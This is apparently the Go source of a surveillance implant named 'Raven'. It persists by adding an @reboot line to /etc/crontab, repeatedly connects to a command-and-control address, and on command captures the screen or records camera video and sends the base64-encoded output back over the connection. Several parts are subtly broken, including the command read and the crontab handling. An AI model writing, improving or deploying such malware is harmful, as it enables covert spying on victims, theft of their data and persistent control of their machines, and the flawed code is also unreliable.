package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"image/png"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	sr "github.com/fstanis/screenresolution"
	"github.com/kbinani/screenshot"
	"gocv.io/x/gocv"
)

const (
	HOST = "127.0.0.1"
	PORT = 12345
)

func main() {
	fmt.Println("[*] Initializing Raven ...")

	if !is_persistent() {
		persist()
	}

	reach_command_and_control()
}

func is_persistent() bool {
	// check whether or not a cronjob exists for the program

	flag := "raven"
	file, _ := os.Open("/etc/crontab")
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, flag) {
			return true
		}
	}
	return false
}

func persist() {
	// achieve persistence by creating a cronjob

	file_path, _ := os.Executable()
	line := fmt.Sprintf("@reboot %s", file_path)
	file, _ := os.OpenFile("/etc/crontab", os.O_WRONLY|os.O_APPEND, 0644)
	scanner := bufio.NewScanner(file)
	var content string
	for scanner.Scan() {
		content += scanner.Text() + "\n"
	}

	content += line + "\n"
	_, err := file.Write([]byte(content))
	if err != nil {
		fmt.Println(err.Error())
	} else {
		fmt.Println("[*] Persisted successfully")
	}
}

func has_internet_access() bool {
	// attempt to connect to some live host

	_, err := http.Get("https://google.com")
	return err == nil
}

func reach_command_and_control() {
	// connect to c2 and initiate communication

	if has_internet_access() {
		addr := fmt.Sprintf("%s:%d", HOST, PORT)
		conn, err := net.Dial("tcp", addr)
		if err != nil {
			time.Sleep(time.Second * 30)
			reach_command_and_control()
		} else {
			// communication with C2
			engage_via(conn)
		}
	} else {
		time.Sleep(time.Second * 30)
		reach_command_and_control()
	}
}

func engage_via(conn net.Conn) {
	// continually receive commands from c2 and act on them

	for {
		var cmd, result string
		conn.Read([]byte(cmd))
		if cmd == "capture_screen" {
			result = screen_capture()
			conn.Write([]byte(result))
		} else if cmd == "record_screen" {
			result = screen_record(5)
			conn.Write([]byte(result))
		}
	}
}

func b64_file(file string) string {
	content, _ := os.ReadFile(file)
	return b64.StdEncoding.EncodeToString(content)
}

func screen_capture() string {
	bounds := screenshot.GetDisplayBounds(0)
	img, _ := screenshot.CaptureRect(bounds)
	file := "/etc/screen.png"
	f, _ := os.Create(file)
	png.Encode(f, img)
	result := b64_file(file)
	os.Remove(file)

	return result
}

func screen_record(t int) string {
	file := "screen.avi"
	res := sr.GetPrimary()
	width, height := res.Width, res.Height

	capture, _ := gocv.OpenVideoCapture(0)
	capture.Set(gocv.VideoCaptureFrameWidth, float64(width))
	capture.Set(gocv.VideoCaptureFrameHeight, float64(height))
	writer, _ := gocv.VideoWriterFile(file, "MJPG", 30, width, height, true)

	endTime := time.Now().Add(time.Second * time.Duration(t))
	for time.Now().Before(endTime) {
		img := gocv.NewMat()
		capture.Read(&img)
		writer.Write(img)
		img.Close()
	}

	capture.Close()
	result := b64_file(file) 
	os.Remove(file)

	return result
}
